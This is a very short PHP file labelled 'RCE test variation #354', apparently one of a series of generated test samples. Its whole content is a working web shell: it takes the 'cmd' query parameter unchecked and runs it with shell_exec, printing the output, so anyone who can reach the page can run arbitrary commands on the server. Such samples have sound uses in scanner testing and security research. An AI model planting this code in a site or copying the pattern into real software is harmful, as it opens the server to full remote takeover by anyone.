<?php
// RCE test variation #354
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>